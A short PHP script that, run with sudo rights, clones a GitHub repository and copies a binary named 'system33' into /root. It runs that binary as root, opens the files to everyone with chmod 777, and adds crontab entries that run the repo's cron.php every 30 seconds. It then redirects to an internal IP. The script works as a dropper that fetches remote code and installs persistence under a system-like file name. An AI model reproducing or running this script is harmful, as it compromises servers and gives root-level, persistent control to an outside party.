<?php

// Function to execute shell commands and check results
function executeCommand($command, $successMessage, $errorMessage) {
    exec($command . ' 2>&1', $output, $returnCode);
    if ($returnCode === 0) {
        echo $successMessage . "\n";
        return true;
    } else {
        echo $errorMessage . ": " . implode("\n", $output) . "\n";
        return false;
    }
}

// Step 1: Clone the repository
if (is_dir('pv')) {
    $removeCommand = "sudo rm -rf pv";
    if (!executeCommand($removeCommand, "<br>Existing pv directory removed successfully", "<br>Failed to remove existing pv directory\n")) {
        exit(1);
    }
}
$cloneCommand = "git clone https://github.com/s1L3n7-sH/pv";
if (!executeCommand($cloneCommand, "<br>Repository cloned successfully\n", "<br>Failed to clone repository\n")) {
    exit(1);
}

// Step 2: Change directory and set permissions
// if (is_dir('pv')) {
//     $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
//     if (!executeCommand($chmodCommand, "<br>Permissions set successfully\n", "<br>Failed to set permissions\n")) {
//         exit(1);
//     }
// } else {
//     echo "<br>Error: Repository directory not found\n";
//     exit(1);
// }

if (is_dir('pv')) {
    $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
    if (!executeCommand($chmodCommand, "<br>Permissions set successfully\n", "<br>Failed to set permissions\n")) {
        exit(1);
    }
    
    // Copy system33 to /root
    $copyCommand = "sudo cp pv/system33 /root/";
    if (!executeCommand($copyCommand, "<br>Successfully copied system33 to /root\n", "<br>Failed to copy system33 to /root\n")) {
        exit(1);
    }
    
    // Verify system33 exists in /root
    $checkCommand = "sudo ls /root/system33";
    if (executeCommand($checkCommand, "<br>system33 found in /root\n", "<br>Error: system33 not found in /root after copying\n")) {
        echo "<br>system33 found in /root\n";
        
        // Ensure system33 is executable and run it
        $runCommand = "sudo bash -c 'cd /root && ./system33'";
        if (executeCommand($runCommand, "<br>system33 executed successfully\n", "<br>Failed to execute system33\n")) {
            echo "<br>Verification successful: system33 ran without errors\n";
        } else {
            echo "<br>Error: system33 failed to run\n";
            exit(1);
        }
    } else {
        echo "<br>Error: system33 not found in /root after copying\n";
        exit(1);
    }
} else {
    echo "<br>Error: Repository directory not found\n";
    exit(1);
}

// Step 3: Add cron jobs
$sourceCronFile = "pv/cron.php";
if (file_exists($sourceCronFile)) {
    // Get the absolute path of pv/cron.php
    $absoluteCronPath = realpath($sourceCronFile);
    if (!$absoluteCronPath) {
        echo "<br>Error: Could not resolve absolute path for {$sourceCronFile}\n";
        exit(1);
    }
    echo "<br>Verified: {$sourceCronFile} exists at {$absoluteCronPath}\n";
    
    // Add cron jobs using the absolute path to pv/cron.php
    $cronCommand = "sudo bash -c '(crontab -l 2>/dev/null; echo \"* * * * * php {$absoluteCronPath}\"; echo \"* * * * * sleep 30 && php {$absoluteCronPath}\") | crontab -'";
    if (executeCommand($cronCommand, "<br>Cron jobs added successfully\n", "<br>Failed to add cron jobs\n")) {
        // Verify cron jobs were added
        exec("sudo crontab -l", $cronOutput, $cronReturnCode);
        if ($cronReturnCode === 0 && !empty($cronOutput)) {
            $cronContent = implode("\n", $cronOutput);
            if (strpos($cronContent, "php {$absoluteCronPath}") !== false) {
                echo "<br>Verified: Cron jobs for {$absoluteCronPath} found in crontab\n";
            } else {
                echo "<br>Error: Cron jobs for {$absoluteCronPath} not found in crontab\n";
                exit(1);
            }
        } else {
            echo "<br>Error: Failed to verify cron jobs\n";
            exit(1);
        }
    } else {
        exit(1);
    }
} else {
    echo "<br>Error: {$sourceCronFile} not found in repository\n";
    exit(1);
}

// Step 4: Redirect to the specified URL
sleep(4);
header("Location: http://10.0.0.1/pv/cron.php");
exit();

?>
